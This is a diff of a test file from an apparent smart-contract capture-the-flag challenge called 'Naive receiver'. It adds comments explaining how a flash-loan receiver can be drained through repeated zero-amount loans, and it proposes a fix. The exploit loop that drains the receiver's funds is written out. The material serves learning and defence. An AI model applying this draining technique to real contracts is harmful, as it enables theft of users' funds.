@@ -31,8 +31,16 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        //pool sends 0 ether to receiver using the receiveEther function in FlashLoanReceiver.
-        //FlashLoanReceiver returns the fee without checking the sent amount.
+        /**
+         * Exploit:
+         * Pool can send 0 ether to receiver using the receiveEther function in FlashLoanReceiver. 
+         * FlashLoanReceiver returns the fee without checking the sent amount. Thus, pool can drain the
+         * funds of the receiver.
+         * 
+         * Solution:
+         * Receiver should check the amount sent before using the loan. 
+         * 
+         */
         while(await ethers.provider.getBalance(this.receiver.address) >= await this.pool.fixedFee()){
             await this.pool.connect(attacker).flashLoan(this.receiver.address,ethers.utils.parseEther('0'))
         }
